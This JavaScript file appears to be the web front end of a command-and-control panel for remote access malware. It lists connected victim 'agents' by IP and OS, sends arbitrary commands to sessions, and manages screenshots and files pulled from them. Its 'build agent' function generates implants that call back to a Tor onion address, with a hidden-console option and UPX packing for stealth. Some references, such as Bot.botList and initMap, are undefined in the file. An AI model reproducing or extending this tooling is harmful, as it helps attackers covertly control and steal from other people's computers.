let currentSession = null;

document.addEventListener('DOMContentLoaded', function() {
    // Tab handling
    const tabButtons = document.querySelectorAll('.tab-button');
    tabButtons.forEach(button => {
        button.addEventListener('click', () => {
            const tabName = button.dataset.tab;
            switchTab(tabName);
        });
    });
    
    // Initialize storage
    updateStorage();
});

function switchTab(tabName) {
    // Update buttons
    document.querySelectorAll('.tab-button').forEach(btn => {
        btn.classList.remove('active');
    });
    document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');
    
    // Update panes
    document.querySelectorAll('.tab-pane').forEach(pane => {
        pane.classList.remove('active');
    });
    document.getElementById(`${tabName}-tab`).classList.add('active');
    
    // Refresh content if needed
    if (tabName === 'storage') {
        updateStorage();
    }
}

function updateStorage() {
    // Fetch and update storage contents
    fetch('/api/storage')
        .then(response => response.json())
        .then(data => {
            updateFileList('downloads-list', data.downloads);
            updateFileList('screenshots-list', data.screenshots);
            updateFileList('uploads-list', data.uploads);
        });
}

function updateFileList(elementId, files) {
    const element = document.getElementById(elementId);
    element.innerHTML = files.map(file => `
        <div class="file-item">
            <span>${file.name}</span>
            <div class="file-actions">
                <button onclick="downloadFile('${file.path}')" title="Download">
                    <span class="material-icons">download</span>
                </button>
                <button onclick="deleteFile('${file.path}')" title="Delete">
                    <span class="material-icons">delete</span>
                </button>
            </div>
        </div>
    `).join('');
}

function downloadFile(path) {
    window.open(`/download/${encodeURIComponent(path)}`, '_blank');
}

function deleteFile(path) {
    if (confirm('Are you sure you want to delete this file?')) {
        fetch('/api/delete_file', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ path })
        })
        .then(response => response.json())
        .then(() => updateStorage());
    }
}

function updateTargets() {
    fetch('/api/targets')
        .then(response => response.json())
        .then(targets => {
            const targetsList = document.getElementById('targets-list');
            targetsList.innerHTML = '';
            
            if (targets.length === 0) {
                targetsList.innerHTML = `
                    <div class="no-targets">
                        <span class="material-icons">devices_off</span>
                        <p>No agents connected</p>
                    </div>`;
                return;
            }
            
            targets.forEach(target => {
                const targetElement = document.createElement('div');
                targetElement.className = 'target-item';
                if (currentSession === target.id) {
                    targetElement.className += ' selected';
                }
                
                const [ip, port] = target.ip.replace(/[()]/g, '').split(',');
                const connectedTime = new Date(target.connected_time);
                const timeAgo = getTimeAgo(connectedTime);
                
                targetElement.innerHTML = `
                    <div class="agent-icon">
                        <span class="material-icons">${getOSIcon(target.os_type)}</span>
                    </div>
                    <div class="agent-info">
                        <div class="agent-details">
                            <div class="agent-header">
                                <div class="status-badge online"></div>
                                <div class="agent-name">${target.alias}</div>
                                <div class="os-type">${target.os_type}</div>
                            </div>
                            <div class="agent-meta">
                                <span>
                                    <span class="material-icons">router</span>
                                    ${ip}:${port}
                                </span>
                                <span>
                                    <span class="material-icons">schedule</span>
                                    ${timeAgo}
                                </span>
                                <span>
                                    <span class="material-icons">memory</span>
                                    Session #${target.id}
                                </span>
                            </div>
                        </div>
                        <div class="agent-actions">
                            <button class="agent-action" onclick="event.stopPropagation(); selectSession(${target.id})" title="Command">
                                <span class="material-icons">terminal</span>
                            </button>
                            <button class="agent-action" onclick="event.stopPropagation(); renameSession(${target.id})" title="Rename">
                                <span class="material-icons">edit</span>
                            </button>
                            <button class="agent-action" onclick="event.stopPropagation(); terminateSession(${target.id})" title="Terminate">
                                <span class="material-icons">close</span>
                            </button>
                        </div>
                    </div>
                `;
                
                targetElement.onclick = () => selectSession(target.id);
                targetsList.appendChild(targetElement);
            });
        });
}

function getTimeAgo(date) {
    const seconds = Math.floor((new Date() - date) / 1000);
    
    let interval = seconds / 31536000;
    if (interval > 1) return Math.floor(interval) + ' years ago';
    
    interval = seconds / 2592000;
    if (interval > 1) return Math.floor(interval) + ' months ago';
    
    interval = seconds / 86400;
    if (interval > 1) return Math.floor(interval) + ' days ago';
    
    interval = seconds / 3600;
    if (interval > 1) return Math.floor(interval) + ' hours ago';
    
    interval = seconds / 60;
    if (interval > 1) return Math.floor(interval) + ' minutes ago';
    
    return Math.floor(seconds) + ' seconds ago';
}

function selectSession(sessionId) {
    currentSession = sessionId;
    const commandPanel = document.querySelector('.command-panel');
    const sessionInfo = document.getElementById('current-session');
    const target = Bot.botList[sessionId];
    
    // Update UI to show command panel
    commandPanel.classList.add('active');
    
    // Update session info
    sessionInfo.innerHTML = `
        <div class="session-title">
            <span class="material-icons">computer</span>
            Session ${sessionId}
            <span class="status">(Connected)</span>
        </div>
        <div class="session-details">
            IP: ${target.ip}<br>
            Alias: ${target.alias}
        </div>
    `;
    
    // Clear previous output
    document.getElementById('output').textContent = '';
    
    // Focus command input
    document.getElementById('command-input').focus();
    
    updateTargets();
}

function deselectSession() {
    currentSession = null;
    const commandPanel = document.querySelector('.command-panel');
    const sessionInfo = document.getElementById('current-session');
    
    // Hide command panel
    commandPanel.classList.remove('active');
    
    // Update session info
    sessionInfo.innerHTML = `
        <div class="no-session-message">
            <span class="material-icons">terminal_off</span>
            <div>No active session selected</div>
            <div>Click on a session to start commanding</div>
        </div>
    `;
    
    updateTargets();
}

function setLoading(isLoading) {
    const sendButton = document.querySelector('.send-button');
    if (isLoading) {
        sendButton.innerHTML = '<div class="loading"></div>';
        sendButton.disabled = true;
    } else {
        sendButton.innerHTML = '<span class="material-icons">send</span> Send';
        sendButton.disabled = false;
    }
}

function sendCommand() {
    if (!currentSession && document.getElementById('command-input').value !== 'help') {
        alert('Please select a session first');
        return;
    }
    
    const commandInput = document.getElementById('command-input');
    const command = commandInput.value;
    
    if (!command) return;
    
    setLoading(true);
    
    fetch('/api/send_command', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            session_id: currentSession || 0,
            command: command
        })
    })
    .then(response => response.json())
    .then(data => {
        const output = document.getElementById('output');
        if (command === 'help') {
            output.innerHTML += `\n> ${command}\n<div class="help-text">${formatHelpText(data.result)}</div>\n`;
        } else {
            output.textContent += `\n> ${command}\n${data.result || data.message}\n`;
        }
        output.scrollTop = output.scrollHeight;
        commandInput.value = '';
        
        if (command === 'quit') {
            currentSession = null;
            document.getElementById('current-session').textContent = 'None';
            updateTargets();
        }
        
        if (command) {
            commandHistory.push(command);
            commandIndex = -1;
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error sending command');
    })
    .finally(() => {
        setLoading(false);
    });
}

function uploadFile() {
    const fileInput = document.getElementById('file-input');
    const file = fileInput.files[0];
    
    if (!file) {
        alert('Please select a file first');
        return;
    }
    
    const formData = new FormData();
    formData.append('file', file);
    
    fetch('/api/upload', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        const output = document.getElementById('output');
        output.textContent += `\n> File Upload: ${data.message}\n`;
        output.scrollTop = output.scrollHeight;
        fileInput.value = '';
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error uploading file');
    });
}

function showHelp() {
    fetch('/api/send_command', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            session_id: currentSession || 0,
            command: 'help'
        })
    })
    .then(response => response.json())
    .then(data => {
        const output = document.getElementById('output');
        output.innerHTML += `\n<div class="help-text">${formatHelpText(data.result)}</div>\n`;
        output.scrollTop = output.scrollHeight;
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error getting help');
    });
}

function formatHelpText(text) {
    return text.replace(/^([A-Za-z\s]+):$/gm, '<div class="command-category">$1:</div>')
               .replace(/^\s\s([a-z_]+.*-->.*$)/gm, '<div class="command-item">$1</div>')
               .replace(/\n/g, '<br>');
}

function clearOutput() {
    const output = document.getElementById('output');
    output.textContent = '';
}

// Update targets list every 7 seconds
const UPDATE_INTERVAL = 7000;

function startTargetUpdates() {
    // Initial update
    updateTargets();
    
    // Set interval for updates
    setInterval(() => {
        updateTargets();
        
        // Show update indicator
        const targetPanel = document.querySelector('.targets-panel h2');
        targetPanel.classList.add('updating');
        
        // Remove indicator after animation
        setTimeout(() => {
            targetPanel.classList.remove('updating');
        }, 1000);
    }, UPDATE_INTERVAL);
}

// Start the update cycle
startTargetUpdates();

// Handle Enter key in command input
document.getElementById('command-input').addEventListener('keypress', function(e) {
    if (e.key === 'Enter') {
        sendCommand();
    }
});

// Update the command input to support command history
let commandHistory = [];
let commandIndex = -1;

document.getElementById('command-input').addEventListener('keydown', function(e) {
    if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (commandHistory.length > 0 && commandIndex < commandHistory.length - 1) {
            commandIndex++;
            this.value = commandHistory[commandHistory.length - 1 - commandIndex];
        }
    } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (commandIndex > 0) {
            commandIndex--;
            this.value = commandHistory[commandHistory.length - 1 - commandIndex];
        } else if (commandIndex === 0) {
            commandIndex = -1;
            this.value = '';
        }
    }
});

// Add new functions for session management
function renameSession(sessionId) {
    const newAlias = prompt('Enter new alias for session ' + sessionId);
    if (newAlias) {
        fetch('/api/set_alias', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                session_id: sessionId,
                alias: newAlias
            })
        })
        .then(response => response.json())
        .then(() => {
            updateTargets();
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Error renaming session');
        });
    }
}

function terminateSession(sessionId) {
    if (confirm('Are you sure you want to terminate this session?')) {
        sendCommandToSession(sessionId, 'quit')
            .then(() => {
                if (currentSession === sessionId) {
                    deselectSession();
                }
                updateTargets();
            });
    }
}

function sendCommandToSession(sessionId, command) {
    return fetch('/api/send_command', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            session_id: sessionId,
            command: command
        })
    })
    .then(response => response.json());
}

// Initialize map when page loads
document.addEventListener('DOMContentLoaded', initMap);

// Add these event listeners
document.addEventListener('DOMContentLoaded', () => {
    initTheme();
    document.getElementById('theme-toggle').addEventListener('change', toggleTheme);
});

// Add build agent functionality
function buildAgent() {
    const buildStatus = document.querySelector('.build-status');
    const progress = buildStatus.querySelector('.progress');
    const statusText = buildStatus.querySelector('.status-text');
    
    // Get selected language
    const selectedLanguage = document.querySelector('input[name="language"]:checked').value;
    
    // Get selected skills
    const selectedSkills = Array.from(document.querySelectorAll('input[name="skills"]:checked'))
        .map(checkbox => checkbox.value);
    
    const buildData = {
        language: selectedLanguage,
        platform: document.getElementById('platform-select').value,
        onion_address: document.getElementById('onion-address').value,
        port: document.getElementById('port-number').value,
        options: {
            noconsole: document.getElementById('option-noconsole').checked,
            upx: document.getElementById('option-upx').checked
        },
        skills: selectedSkills
    };
    
    // Validate required fields
    if (!buildData.onion_address) {
        alert('Please enter an onion address');
        return;
    }
    
    if (selectedSkills.length === 0) {
        if (!confirm('No capabilities selected. Build minimal agent?')) {
            return;
        }
    }
    
    // Show build status
    buildStatus.style.display = 'block';
    buildStatus.className = 'build-status';
    progress.style.width = '0%';
    statusText.textContent = 'Starting build process...';
    
    fetch('/api/build_agent', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(buildData)
    })
    .then(response => {
        if (!response.ok) throw new Error('Build failed');
        return response.json();
    })
    .then(data => {
        if (data.status === 'building') {
            // Poll build status
            pollBuildStatus(data.build_id);
        } else {
            showBuildComplete(data);
        }
    })
    .catch(error => {
        buildStatus.className = 'build-status error';
        statusText.textContent = `Build failed: ${error.message}`;
    });
}

function pollBuildStatus(buildId) {
    const buildStatus = document.querySelector('.build-status');
    const progress = buildStatus.querySelector('.progress');
    const statusText = buildStatus.querySelector('.status-text');
    
    const poll = () => {
        fetch(`/api/build_status/${buildId}`)
            .then(response => response.json())
            .then(data => {
                progress.style.width = `${data.progress}%`;
                statusText.textContent = data.status;
                
                if (data.state === 'building') {
                    setTimeout(poll, 1000);
                } else if (data.state === 'complete') {
                    showBuildComplete(data);
                } else if (data.state === 'error') {
                    throw new Error(data.error);
                }
            })
            .catch(error => {
                buildStatus.className = 'build-status error';
                statusText.textContent = `Build failed: ${error.message}`;
            });
    };
    
    poll();
}

function showBuildComplete(data) {
    const buildStatus = document.querySelector('.build-status');
    const progress = buildStatus.querySelector('.progress');
    const statusText = buildStatus.querySelector('.status-text');
    
    buildStatus.className = 'build-status success';
    progress.style.width = '100%';
    statusText.innerHTML = `
        Build complete! <br>
        <a href="/download/${data.filename}" class="download-link">
            <span class="material-icons">download</span>
            Download Agent
        </a>
    `;
}

function getOSIcon(osType) {
    const osLower = osType.toLowerCase();
    if (osLower.includes('windows')) return 'computer';
    if (osLower.includes('linux') || osLower.includes('ubuntu') || osLower.includes('kali')) return 'laptop_linux';
    if (osLower.includes('mac') || osLower.includes('macos')) return 'laptop_mac';
    return 'devices';
} 